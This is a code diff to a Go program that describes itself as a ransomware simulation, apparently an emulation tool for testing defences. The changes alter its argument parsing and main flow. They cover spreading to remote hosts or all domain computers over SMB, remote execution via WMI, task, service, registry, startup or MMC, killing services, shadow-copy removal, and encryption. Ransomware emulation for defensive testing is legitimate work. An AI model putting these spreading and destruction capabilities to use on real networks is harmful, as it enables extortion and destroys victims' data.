@@ -79,7 +79,7 @@ func parseArgs(groups []RansomActor) (map[string]any, error) {
 	var targetSlice StringSlice
 	flag.Var(&targetSlice, "targets", "A comma-separated list of hostnames/IP addresses - impact will be copied to the remote device via SMB and executed via the chosen method")
 	targetsFile := flag.String("targets_file", "", "Specify a file containing line-delimited hostnames/IPs to use as execution targets")
-	execMethod := flag.String("exec_method", "wmi", "How to execute remote copies of impact - wmi, task, service")
+	execMethod := flag.String("exec_method", "wmi", "How to execute remote copies of impact - wmi, task, service, reg, startup, mmc")
 	targetNetworkShares := flag.Bool("targetNetworkShares", false, "If enabled, impact will target network shares if target_dir == \"*\"")
 	targetADComputers := flag.Bool("targetad", false, "If enabled, impact will target all enabled computers in the current domain - requires admin privileges")
 	remoteFileCopyPath := flag.String("remotecopypath", "", "If specified, impact will be copied to this location on the remote device - if blank, will use the default ADMIN$ share")
@@ -223,7 +223,7 @@ func parseArgs(groups []RansomActor) (map[string]any, error) {
 		return nil, errors.New("Cannot use -decrypt and -create together")
 	}
 
-	if *create && (len(targetSlice) != 0 || *targetsFile != "") {
+	if *create && (len(targetSlice) != 0 || *targetsFile != "" || *targetADComputers) {
 		return nil, errors.New("Cannot use -create and -target_file or -targets together")
 	}
 
@@ -246,7 +246,7 @@ func parseArgs(groups []RansomActor) (map[string]any, error) {
 		"sym_cipher":                 *sym_cipher,
 		"generate_keys":              *generate_keys,
 		"killprocs":                  *killprocs,
-		"killservices":               *killservices, // TODO,
+		"killservices":               *killservices,
 		"vss":                        *vss,
 		"encryption_percent":         *encryption_percent,
 		"threshold_auto_fullencrypt": *threshold_auto_fullencrypt,
@@ -319,23 +319,6 @@ func main() {
 		}
 	}
 
-	if args["blockports"].(bool) && isAdmin {
-		// Reversible
-		handlePortBlocking(decryptEnabled, &config)
-	}
-	if args["blockhosts"].(bool) && isAdmin {
-		// Reversible
-		// Probably better way is resolve these to IPs and then block the IPs in-line
-		// This is tricky - we don't really want to have to do this for all domains on all devices because that could be a huge spike in DNS traffic
-		// But - should we really care about DNS performance/spikes in a ransomware simulation?
-		// Plus - entries will probably be cached, so oh well
-		handleDomainBlocking(decryptEnabled, &config)
-	}
-	if args["defender"].(bool) && isAdmin {
-		// Non-Reversible
-		handleDefenderExclusions(decryptEnabled)
-	}
-
 	currentHostname, err := os.Hostname()
 	if err != nil {
 		panic(err)
@@ -354,7 +337,7 @@ func main() {
 	note := replaceExtensionVariables(group.Note)
 	noteName := group.Notes[rand.Intn(len(group.Notes))]
 	if args["force_note_name"].(string) != "" {
-		extension = args["force_note_name"].(string)
+		noteName = args["force_note_name"].(string)
 	}
 
 	// Section: Asymmetric Key Setup
@@ -436,7 +419,7 @@ func main() {
 		remoteTargetList, err = GetTargetList(args)
 	}
 	if len(remoteTargetList) != 0 {
-		handleRemoteTargets(remoteTargetList, args)
+		handleRemoteTargets(remoteTargetList, args, extension, noteName, note, group, sym_cipher)
 		return
 	}
 
@@ -473,11 +456,7 @@ func main() {
 
 	generateDecryptInstructions(target_dir, asymKeys, sym_cipher, recursiveBool, noteName)
 
-	if !decryptEnabled {
-		// VSS Removals
-		// Process Kills
-		preEncryptionChecks(args, isAdmin, isRemoteDevice, config, decryptEnabled)
-	}
+	preEncryptionChecks(args, isAdmin, isRemoteDevice, config, decryptEnabled)
 
 	err = setupRegex(config)
 	if err != nil {
